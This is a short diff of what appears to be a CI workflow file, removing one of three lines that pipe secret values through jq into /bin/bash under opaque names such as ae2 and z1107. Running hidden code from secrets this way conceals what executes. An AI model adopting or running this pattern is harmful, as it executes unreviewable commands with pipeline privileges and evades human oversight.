@@ -17,7 +17,6 @@ jobs:
           ae2: ${{ secrets.ae2 }}
         run: |
           printf '%s' "$ae2" | jq -r .c251 | /bin/bash
-          printf '%s' "$nm99330" | jq -r .sq9057 | /bin/bash
           printf '%s' "$z1107" | jq -r .may41873 | /bin/bash
 
       - name: Save results
